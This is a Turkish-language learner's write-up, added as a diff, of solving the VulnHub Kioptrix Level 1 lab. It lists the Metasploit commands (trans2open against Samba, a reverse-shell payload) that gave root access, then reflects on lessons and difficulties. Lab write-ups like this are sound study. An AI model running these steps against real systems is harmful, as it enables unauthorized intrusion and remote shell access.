@@ -1,1 +1,76 @@
+# Kioptrix Level 1
 
+## 1. Makine Bilgileri
+
+- **Platform:** VulnHub
+- **Zorluk:** Beginner
+- **İşletim Sistemi:** Linux
+- **Tarih:** 26.11.2026
+- **Hedef IP:** 172.20.187.30
+- **Durum:** Root Access Obtained
+
+## 2. Amaç
+
+Hedef makinedeki açık portları Nmap ile tespit etmek, çalışan servisleri incelemek ve Samba servisindeki güvenlik açığından yararlanarak sisteme erişim elde etmek.
+
+## 3. Reconnaissance & Enumeration
+
+Nmap ile gerçekleştirilen tarama sonucunda aşağıdaki portlar tespit edildi:
+
+| Port | Servis |
+|---|---|
+| 22 | SSH |
+| 80 | HTTP |
+| 111 | RPCbind |
+| 139 | NetBIOS / SMB |
+| 443 | HTTPS |
+| 1024 | Tespit edilmesi gereken servis |
+
+Araştırma sonucunda Samba servisi hedef alındı.
+
+## 4. Exploitation
+
+**Kullanılan araç:** Metasploit Framework
+
+**Kullanılan modül:**
+`exploit/linux/samba/trans2open`
+
+**İzlenen adımlar:**
+
+1. `msfconsole` ile Metasploit başlatıldı.
+2. `search samba` ile Samba ile ilgili modüller arandı.
+3. `use exploit/linux/samba/trans2open` ile ilgili exploit seçildi.
+4. `show options` ile gerekli parametreler incelendi.
+5. `set RHOSTS 172.20.187.30` ile hedef IP tanımlandı.
+6. `set payload generic/shell_reverse_tcp` ile payload değiştirildi.
+7. `run` komutu ile exploit çalıştırıldı.
+
+**Sonuç:** Başarılı reverse shell bağlantısı elde edildi ve root erişimine ulaşıldı.
+
+## 5. Öğrendiklerim
+
+1. Samba servislerinin de güvenlik açıkları içerebileceğini ve servis sürümlerinin araştırılması gerektiğini öğrendim.
+2. Metasploit içerisindeki `search` komutuyla exploit modüllerinin aranabildiğini öğrendim.
+3. Exploit ve payload arasındaki farkı öğrendim.
+4. Reverse shell mantığını ve hedef makinenin saldırgan makineye bağlantı başlatmasını öğrendim.
+5. Generic reverse shell payload yaklaşımını öğrendim.
+
+## 6. Zorlandığım Noktalar
+
+- Exploit modülleri arasından doğru olanı seçmek.
+- Payload seçiminin neden değiştirilmesi gerektiğini anlamak.
+- İşlemci mimarisi ile payload uyumluluğunu anlamak.
+
+## 7. Bir Sonraki Sefer Dikkat Edeceğim Şeyler
+
+- Açık portları yalnızca listelemek yerine servisleri ve sürümlerini araştırmak.
+- Exploit seçmeden önce hedef servis ile zafiyet uyumluluğunu doğrulamak.
+- Payload seçimini ezberlemek yerine çalışma mantığını anlamak.
+- Her aşamada neden o komutu kullandığımı not etmek.
+
+## 8. Sonuç ve Öz Değerlendirme
+
+Makineyi tamamen bağımsız şekilde çözemedim. İlk denememde video rehberinden yardım aldım. Ancak işlemlerin amaçlarını anlamaya çalışarak çözümü tekrar uyguladım.
+
+**Bir sonraki hedef:** Aynı makineyi herhangi bir video veya walkthrough kullanmadan yeniden çözmek.
+Hedef başarılı.
